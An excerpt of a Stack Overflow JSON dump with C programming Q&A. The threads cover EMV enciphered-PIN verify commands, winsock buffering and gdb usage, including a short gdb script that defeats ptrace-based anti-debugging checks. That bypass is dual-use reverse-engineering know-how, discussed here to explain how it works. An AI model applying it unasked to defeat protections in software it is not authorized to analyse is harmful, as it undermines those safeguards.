"user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "reply_to_user": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447245143, "post_id": 33647086, "comment_id": 55074592, "body": "@rakeb, if I put apduSend.Lc = 128; of which 128 is the actual length of hex values sent to the card as data in, command is not sent and if i put any other value eg 0, the command is sent and I get a response as 6700"}, {"owner": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447245379, "post_id": 33647086, "comment_id": 55074709, "body": "@Meg, did you sent the command I posted earlier comment? Moreover can you show me the complete APDU command? I&#39;m not sure whether <code>apduSend.Lc = 128;</code> is equivalent as <code>Lc = 0x80;</code>."}, {"owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "reply_to_user": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447247089, "post_id": 33647086, "comment_id": 55075586, "body": "@rakeb, apduSend.Lc = 128; is equivalent to Lc = 0x80;"}, {"owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "reply_to_user": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447247264, "post_id": 33647086, "comment_id": 55075676, "body": "@rakeb \tapduSend.Command[0] = 0x00; \tapduSend.Command[1] = 0x20; \tapduSend.Command[2] = 0x00; \tapduSend.Command[3] = 0x88; \tapduSend.Lc = 0x80;"}, {"owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "reply_to_user": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447247751, "post_id": 33647086, "comment_id": 55075938, "body": "@rakeb, the command You sent earlier worked but it&#39;s for plain pin verification. I am doing enciphered pin where you have to concatenate (7F, pinblock, unpredictable number, random padding), apply rsa algorithm to obtain the Enciphered PIN Data, and then sending the verify command to ICC with the encrypted Enciphered PIN Data."}, {"owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "reply_to_user": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447336740, "post_id": 33647086, "comment_id": 55118958, "body": "@rakeb, do you have an idea of how I can solve that problem? I am still stack"}, {"owner": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447353958, "post_id": 33647086, "comment_id": 55130939, "body": "@Meg, can you provide more information? Like witch payment application are you dealing with (e.g AMEX, JCB, VISA etc)? Do you have their specification?"}, {"owner": {"reputation": 6033, "user_id": 5128464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/25BuB.png?s=128&g=1", "display_name": "vlp", "link": "https://stackoverflow.com/users/5128464/vlp"}, "reply_to_user": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447374437, "post_id": 33647086, "comment_id": 55140793, "body": "As @rakeb.mazharul says, the PIN block for PIN &quot;1234&quot; should be <code>241234FFFFFFFFFF</code>. Did you try this value (of course encrypted according to Book 2)?"}, {"owner": {"reputation": 1850, "user_id": 4963244, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34e2b8e5dbeeefcfad35b4bcff6ecc1f?s=128&d=identicon&r=PG", "display_name": "iso8583.info support", "link": "https://stackoverflow.com/users/4963244/iso8583-info-support"}, "edited": false, "score": 0, "creation_date": 1447399419, "post_id": 33647086, "comment_id": 55147494, "body": "@Meg, please ensure you put Enciphered PIN Block into the APDU Data as HEX, and not as String. Add your source part where you place Binary Enciphered PIN Block into APDU Data variable."}, {"owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "reply_to_user": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447402192, "post_id": 33647086, "comment_id": 55148619, "body": "@rakeb, I tried it out with a different card and it worked and I got response  SW1 SW2: 67 C1(verify fail, 1 try left), tried with another card and  got SW1 SW2: 69 85(Conditions of use not satified)"}, {"owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "reply_to_user": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447411770, "post_id": 33647086, "comment_id": 55153747, "body": "@rakeb, it worked with a different card and responded with SW1 SW2 9000. Thanks a lot."}, {"owner": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447413659, "post_id": 33647086, "comment_id": 55154792, "body": "@Meg, You are welcome. As I told you earlier most probably your card is not supporting Encipher PIN."}], "owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 477, "favorite_count": 1, "answer_count": 0, "score": 0, "last_activity_date": 1447314162, "creation_date": 1447232158, "last_edit_date": 1447314162, "question_id": 33647086, "link": "https://stackoverflow.com/questions/33647086/emv-enciphered-pin", "title": "emv Enciphered pin", "body": "<p>I am doing card holder verification using enciphered pin and sending the verify command to verify the enciphered pinblock but I am getting res 6700. </p>\n\n<pre><code>TP_ApduSendT apduSend;\nTP_ApduRespT apduResp;\nuint8 slotNo = 0;\n\napduSend.Command[0] = 0x00;\napduSend.Command[1] = 0x20;\napduSend.Command[2] = 0x00;\napduSend.Command[3] = 0x88;\napduSend.Lc = 128;\napduSend.Le = 0;\n</code></pre>\n\n<p>The enciphered data is 128 bytes.</p>\n"}, {"tags": ["c", "assembly", "gdb"], "answers": [{"tags": [], "owner": {"reputation": 2286, "user_id": 3228495, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e0163d41bd310e00b055618846734b0?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew", "link": "https://stackoverflow.com/users/3228495/andrew"}, "is_accepted": false, "score": 0, "last_activity_date": 1447233587, "creation_date": 1447233587, "answer_id": 33647443, "question_id": 33646927, "link": "https://stackoverflow.com/questions/33646927/bypassing-ptrace-in-gdb/33647443#33647443", "title": "Bypassing ptrace in gdb", "body": "<p>The <code>ptrace</code> system call allows one process to trace another.  My guess is that your application (that is trying to detect the debugger) spawns a child process (or maybe thread) and then uses <code>ptrace</code> to attach to this child, just like a debugger would.</p>\n\n<p>The catch is that only one process can trace another, if a second process tries to attach with <code>ptrace</code> then the second <code>ptrace</code> will fail, returning <code>-1</code> and setting <code>errno</code> to <code>EPERM</code>.  If you are running under a debugger then the debugger will have got in first and attached with <code>ptrace</code>, so when the application itself tries to attach with <code>ptrace</code> this call will fail.</p>\n\n<p>So, in your example, when the catchpoint triggers on the <em>return</em> from syscall ptrace you can see that <code>eax</code> is set to -1, indicating that the syscall failed (register eax holds the return value on x86-64).</p>\n\n<p>Now if the code in the application you are debugging is not very good, and it only checks to see if <code>ptrace</code> returns success or not, then forcing the value of <code>eax</code> to be 0 (where 0 indicates success for <code>ptrace</code>) <em>might</em> be enough to fool the application into thinking that it is not running under a debugger.</p>\n\n<p>Obviously, it would be possible to write more complex code in the application that makes more extensive use of <code>ptrace</code> such that it would be <em>harder</em> (though not impossible) to work around this detection.</p>\n"}], "owner": {"reputation": 3063, "user_id": 4133947, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/99688fdb4523347fb5e789c3705350d4?s=128&d=identicon&r=PG&f=1", "display_name": "robert", "link": "https://stackoverflow.com/users/4133947/robert"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 2205, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447233587, "creation_date": 1447231527, "question_id": 33646927, "link": "https://stackoverflow.com/questions/33646927/bypassing-ptrace-in-gdb", "title": "Bypassing ptrace in gdb", "body": "<p>I found the following trick to use if a program uses <code>ptrace</code> to detect whether it is running in a debugger:</p>\n\n<pre><code>catch syscall ptrace\ncommands 1\nset ($eax) = 0\ncontinue\nend\n</code></pre>\n\n<p>Can somebody explain me how is it working? I have tried to insert <code>i r eax</code> after <code>commands 1</code>, however I do not understand the negative values I have got:</p>\n\n<pre><code>Catchpoint 1 (call to syscall ptrace), 0x00007ffff778af1e in ptrace (request=PTRACE_TRACEME) at ../sysdeps/unix/sysv/linux/ptrace.c:45\n45  ../sysdeps/unix/sysv/linux/ptrace.c: No such file or directory.\neax            0xffffffda   -38\n\nCatchpoint 1 (returned from syscall ptrace), 0x00007ffff778af1e in ptrace (request=PTRACE_TRACEME) at ../sysdeps/unix/sysv/linux/ptrace.c:45\n45  in ../sysdeps/unix/sysv/linux/ptrace.c\neax            0xffffffff   -1\n</code></pre>\n"}, {"tags": ["c", "debugging", "gdb", "embedded"], "answers": [{"comments": [{"owner": {"reputation": 693, "user_id": 1074358, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/iLE1e.jpg?s=128&g=1", "display_name": "9a3eedi", "link": "https://stackoverflow.com/users/1074358/9a3eedi"}, "edited": false, "score": 0, "creation_date": 1447231856, "post_id": 33646912, "comment_id": 55067421, "body": "This works. I should&#39;ve checked the GDB documentation more carefully. I didn&#39;t think GDB was the right tool for this.... thanks!"}, {"owner": {"reputation": 18871, "user_id": 1442050, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e975c669f2ce0f2be4613f1e123864b3?s=128&d=identicon&r=PG", "display_name": "Tom Tromey", "link": "https://stackoverflow.com/users/1442050/tom-tromey"}, "edited": false, "score": 2, "creation_date": 1447249810, "post_id": 33646912, "comment_id": 55077096, "body": "This approach works fine sometimes, but not always.  It won&#39;t work if you have shared libraries or if you are using ASLR.  In those cases you need to know both the PC and the mappings; then maybe some invocation of <code>objdump</code> would work ok."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 2, "last_activity_date": 1447231454, "creation_date": 1447231454, "answer_id": 33646912, "question_id": 33646790, "link": "https://stackoverflow.com/questions/33646790/finding-line-number-info-from-a-pc-register-value/33646912#33646912", "title": "Finding line number info from a PC register value", "body": "<p>From <a href=\"http://www.chemie.fu-berlin.de/chemnet/use/info/gdb/gdb_8.html#SEC50\" rel=\"nofollow\">this part of the documentation</a> you can use the <code>info</code> command:</p>\n\n<pre><code>info line *0x63ff\n</code></pre>\n\n<p>That gets the line information for the code at address <code>0x63ff</code>. Replace the address in the example with your own.</p>\n"}], "owner": {"reputation": 693, "user_id": 1074358, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/iLE1e.jpg?s=128&g=1", "display_name": "9a3eedi", "link": "https://stackoverflow.com/users/1074358/9a3eedi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 348, "favorite_count": 0, "accepted_answer_id": 33646912, "answer_count": 1, "score": 1, "last_activity_date": 1447231454, "creation_date": 1447230931, "question_id": 33646790, "link": "https://stackoverflow.com/questions/33646790/finding-line-number-info-from-a-pc-register-value", "title": "Finding line number info from a PC register value", "body": "<p>I have a SPARC embedded executable built with debugging symbols. I ran this executable on a machine using a debug monitor, but without a debugger. The program crashed (segfault) and I found out the value of the PC register from the monitor (note: not a debugger). If I were using gdb at the time I would've known which line number it got stuck in. However, I wasn't using GDB at the time. </p>\n\n<p>I want to find out what C line number the PC value corresponds to. What tool or gdb command can I use to find this out?</p>\n"}, {"tags": ["c", "windows", "sockets", "http", "winsock"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1447229816, "post_id": 33646539, "comment_id": 55066488, "body": "Warning: Don&#39;t use the same buffer as both source and destination in <code>sprintf</code> (or its variants), that&#39;s undefined behavior."}, {"owner": {"reputation": 647, "user_id": 2422669, "user_type": "registered", "accept_rate": 10, "profile_image": "https://www.gravatar.com/avatar/ce364e13067d5d19d9d1b7b7d2fffbb8?s=128&d=identicon&r=PG", "display_name": "Sigcont", "link": "https://stackoverflow.com/users/2422669/sigcont"}, "edited": false, "score": 1, "creation_date": 1447229911, "post_id": 33646539, "comment_id": 55066539, "body": "buffer size does not matter, you can read in a while loop."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1447230026, "post_id": 33646539, "comment_id": 55066593, "body": "Also, don&#39;t call <code>send</code> in a loop while it&#39;s failing, you might end up with an infinite loop. Check the result of <code>recv</code> to see if everything&#39;s okay, and also get the <i>actual</i> size of the data received."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1447230065, "post_id": 33646539, "comment_id": 55066608, "body": "Lastly, you receive into <code>recvbuf</code>, I assume it&#39;s an <i>array</i> of 4096 characters? Then what is <code>filedata</code>?"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1447230196, "post_id": 33646539, "comment_id": 55066664, "body": "There are some slight optimizations. You want to set the size that will work efficiently with your hardware MTU (less a few bytes reserved for packet headers, etc.) In the past there were formulas for computing these approximations in the dial-up world, they may have been relegated to the way of the dinosaur by now.."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1447241686, "post_id": 33646539, "comment_id": 55072783, "body": "What is this <code>sizeof(filedata, 1,  pfile)</code>?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 2, "creation_date": 1447241798, "post_id": 33646539, "comment_id": 55072841, "body": "&quot;<i>you can read in a while loop.</i>&quot; one <b>has to</b> read/receive in a loop, as <code>recv()</code> might very well return few bytes (up to one byte only) as it was told to. Read the documentation closely, including the &quot;RETURNS&quot; section."}, {"owner": {"reputation": 93, "user_id": 5425463, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/aa7c108e557a3ecc6257b47f8c737cc1?s=128&d=identicon&r=PG&f=1", "display_name": "Min Kim", "link": "https://stackoverflow.com/users/5425463/min-kim"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1447289149, "post_id": 33646539, "comment_id": 55098582, "body": "@JoachimPileborg You said a lot of &quot;Don&#39;t&quot;. I&#39;m so NOT sure what to do. Can you write the right example for me please?"}, {"owner": {"reputation": 93, "user_id": 5425463, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/aa7c108e557a3ecc6257b47f8c737cc1?s=128&d=identicon&r=PG&f=1", "display_name": "Min Kim", "link": "https://stackoverflow.com/users/5425463/min-kim"}, "reply_to_user": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1447289206, "post_id": 33646539, "comment_id": 55098603, "body": "@alk It&#39;s a typo, ignore it plz. It should be fwrite(filedata, sizeof(filedata), 1,  pfile)"}, {"owner": {"reputation": 93, "user_id": 5425463, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/aa7c108e557a3ecc6257b47f8c737cc1?s=128&d=identicon&r=PG&f=1", "display_name": "Min Kim", "link": "https://stackoverflow.com/users/5425463/min-kim"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1447289638, "post_id": 33646539, "comment_id": 55098751, "body": "@JoachimPileborg  Here is recvbuf: <code>char recvbuf[buf_size] = {&#39;\\0&#39;};</code> But the size of <code>recvbuf</code>  troubles me too. Should I set <code>buf_size</code> as big as possible like <code>40960</code> or  just the same size as <code>recv()</code> like <code>4096</code> ?  <code>filedata</code> is what should be written in .mp3 file. <code>filedata</code> is not the same as <code>recvbuf</code> ( coz <code>recvbuf</code> contains <code>POST &#47;index.html HTTP&#47;1.1</code> and so on. )"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1447314270, "post_id": 33646539, "comment_id": 55106021, "body": "Like others said, it&#39;s really no use in using such large buffers, or sending such large buffers, as it will be broken down into smaller packages anyway. For starters you should try not to overflow the buffers in the operating system, then the standard <a href=\"https://en.wikipedia.org/wiki/Maximum_transmission_unit\" rel=\"nofollow noreferrer\">MTU</a> on ethernet is less than 1500 bytes, and if the receiving end can&#39;t receive as fast as you expect then you will fill up the receivers OS buffers as well."}], "answers": [{"comments": [{"owner": {"reputation": 30596, "user_id": 134702, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/7c1594304f3515b88e31bc8888f0f593?s=128&d=identicon&r=PG", "display_name": "Matt Hook", "link": "https://stackoverflow.com/users/134702/matt-hook"}, "reply_to_user": {"reputation": 93, "user_id": 5425463, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/aa7c108e557a3ecc6257b47f8c737cc1?s=128&d=identicon&r=PG&f=1", "display_name": "Min Kim", "link": "https://stackoverflow.com/users/5425463/min-kim"}, "edited": false, "score": 0, "creation_date": 1447292073, "post_id": 33662763, "comment_id": 55099427, "body": "Just realised you&#39;ve tagged windows.  Nevertheless these concepts still apply.  Instead of errno you&#39;d check WSAGetLastError() for example."}, {"owner": {"reputation": 30596, "user_id": 134702, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/7c1594304f3515b88e31bc8888f0f593?s=128&d=identicon&r=PG", "display_name": "Matt Hook", "link": "https://stackoverflow.com/users/134702/matt-hook"}, "reply_to_user": {"reputation": 93, "user_id": 5425463, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/aa7c108e557a3ecc6257b47f8c737cc1?s=128&d=identicon&r=PG&f=1", "display_name": "Min Kim", "link": "https://stackoverflow.com/users/5425463/min-kim"}, "edited": false, "score": 0, "creation_date": 1447292280, "post_id": 33662763, "comment_id": 55099498, "body": "sendall takes a pointer to an int, the number of bytes returned.  You might need to do a little bit of tweaking to make it work under windows as the typenames might be different.  SOCKET is int under Linux.  I changed that for you... not sure if it&#39;s quite perfect but you get the idea.   Have a read of Beej&#39;s guide too.  He does talk about windows too."}], "tags": [], "owner": {"reputation": 30596, "user_id": 134702, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/7c1594304f3515b88e31bc8888f0f593?s=128&d=identicon&r=PG", "display_name": "Matt Hook", "link": "https://stackoverflow.com/users/134702/matt-hook"}, "is_accepted": true, "score": 4, "last_activity_date": 1447292167, "last_edit_date": 1447292167, "creation_date": 1447290416, "answer_id": 33662763, "question_id": 33646539, "link": "https://stackoverflow.com/questions/33646539/should-send-and-recv-buffer-size-be-as-big-as-possible/33662763#33662763", "title": "Should send() and recv() buffer size be as big as possible?", "body": "<p>Two problems.  </p>\n\n<p>1) send() doesn't necessarily send everything.  There are situations where it might only send some of what you give it.  So be prepared for that.</p>\n\n<p>2) recv() returns the number of bytes actually read or -1 on error.  You should copy the those bytes from the recvbuf.  Also check the return value.  If it's -1 then there was an error and you need to use errno to find out what the error is.</p>\n\n<p>To ensure everything is sent use sendall (from <a href=\"http://beej.us/guide/bgnet/output/html/singlepage/bgnet.html\" rel=\"nofollow\">Beej's guide</a>):</p>\n\n<pre><code>#include &lt;sys/types.h&gt;\n#include &lt;sys/socket.h&gt;\n\nint sendall(SOCKET s, char *buf, int *len)\n{\n    int total = 0;        // how many bytes we've sent\n    int bytesleft = *len; // how many we have left to send\n    int n;\n\n    while(total &lt; *len) {\n        n = send(s, buf+total, bytesleft, 0);\n        if (n == -1) { break; }\n        total += n;\n        bytesleft -= n;\n    }\n\n    *len = total; // return number actually sent here\n\n    return n==-1?-1:0; // return -1 on failure, 0 on success\n} \n</code></pre>\n\n<p>For receiving something like:</p>\n\n<pre><code>int nbytes = 0;\nwhile ((nbytes = recv(sock, recvbuf , 4096 , 0)) &gt; 0){\n    // From here, valid bytes are from recvbuf to recvbuf + nbytes.\n    // You could simply fwrite(fp, recvbuf, nbytes) or similar. \n}\n</code></pre>\n\n<p>Make sure you don't get confused between application buffers and socket buffers.  They are different things.  The socket buffers are in kernel space.  App buffers are what you're using here.  There is potentially an optimal size but it various depending on what you're doing.  Making them 4K is usually reasonable.</p>\n\n<p>If anything isn't clear, consult Beej's guide.  This is all very simple but in a real app I'd tend to use non-blocking sockets and/or epoll if on Linux.</p>\n"}], "owner": {"reputation": 93, "user_id": 5425463, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/aa7c108e557a3ecc6257b47f8c737cc1?s=128&d=identicon&r=PG&f=1", "display_name": "Min Kim", "link": "https://stackoverflow.com/users/5425463/min-kim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1890, "favorite_count": 1, "accepted_answer_id": 33662763, "answer_count": 1, "score": 0, "last_activity_date": 1447292167, "creation_date": 1447229708, "last_edit_date": 1447289810, "question_id": 33646539, "link": "https://stackoverflow.com/questions/33646539/should-send-and-recv-buffer-size-be-as-big-as-possible", "title": "Should send() and recv() buffer size be as big as possible?", "body": "<p>I'm sending a .mp3 file (.jpg and other extensions as well, size between 1K to 50MB) using winsock over http. The client sends file and the server receives the file .<br>\nI have serveral questions:</p>\n\n<ol>\n<li><p>Should send() buffer size and recv() buffer size be the same? </p></li>\n<li><p>What size should I choose, fixed size or a size big enough to contain all data? </p></li>\n</ol>\n\n<p>Here comes the code. </p>\n\n<p>Client:  </p>\n\n<pre><code>... //POST /index.html HTTP/1.1 and so on\n\nsprintf_s(header, \"%sContent-Length: %d\\r\\n\", header, sizeof(szFileData ));\nsprintf_s(header, \"%s%s\\r\\n\", header , szFileData );  \n\n... //Content-Disposition: form-data; name=\\\"submit\\\" and so on\n\nwhile(send(sock,  header, strlen(header), 0) == SOCKET_ERROR)\n{\n    Sleep(1000);\n}\n</code></pre>\n\n<p>Server\uff1a </p>\n\n<pre><code>recv(sock, recvbuf , 4096 , 0);  //neither strlen(recvbuf) nor 4096 works\n...//extract file name, content and so on\n\nFILE *pFile;\npFile = fopen ( filename , \"wb\" );\nif ( fwrite(filedata, sizeof(filedata), 1,  pfile) != 1)\n{\n    MessageBox(NULL, \"Failed!\", \"MSG\", MB_OK);\n}\n</code></pre>\n\n<p>I get a result that either is empty or loses some content. </p>\n"}, {"tags": ["c++", "c", "floating-point", "precision", "floating-accuracy"], "comments": [{"owner": {"reputation": 57967, "user_id": 2805305, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/442d249754d1725d9510cf06fa46b964?s=128&d=identicon&r=PG&f=1", "display_name": "bolov", "link": "https://stackoverflow.com/users/2805305/bolov"}, "edited": false, "score": 4, "creation_date": 1447228177, "post_id": 33646148, "comment_id": 55065846, "body": "No. no, no, no and no"}, {"owner": {"reputation": 31465, "user_id": 128384, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/cf6f92bfb2a16c0e2c6ca7aef4440862?s=128&d=identicon&r=PG", "display_name": "stijn", "link": "https://stackoverflow.com/users/128384/stijn"}, "edited": false, "score": 1, "creation_date": 1447228349, "post_id": 33646148, "comment_id": 55065909, "body": "I don&#39;t think &#39;precise&#39; is the correct term when referring to whether or not a floating point representation can exactly represent some number?"}, {"owner": {"reputation": 1090, "user_id": 533468, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/46416700a9b6dc1e56839071b2206d7f?s=128&d=identicon&r=PG&f=1", "display_name": "Mahmut Ali &#214;ZKURAN", "link": "https://stackoverflow.com/users/533468/mahmut-ali-%c3%96zkuran"}, "reply_to_user": {"reputation": 57967, "user_id": 2805305, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/442d249754d1725d9510cf06fa46b964?s=128&d=identicon&r=PG&f=1", "display_name": "bolov", "link": "https://stackoverflow.com/users/2805305/bolov"}, "edited": false, "score": 0, "creation_date": 1447228357, "post_id": 33646148, "comment_id": 55065912, "body": "agreed to @bolov i am working on a financial institution and half my time spending on fixing archaic codes that relies on floating point calculation."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1447228585, "post_id": 33646148, "comment_id": 55066012, "body": "Then you should be looking to use some decimal-radix type and throwing out the floating-point completely."}, {"owner": {"reputation": 28011, "user_id": 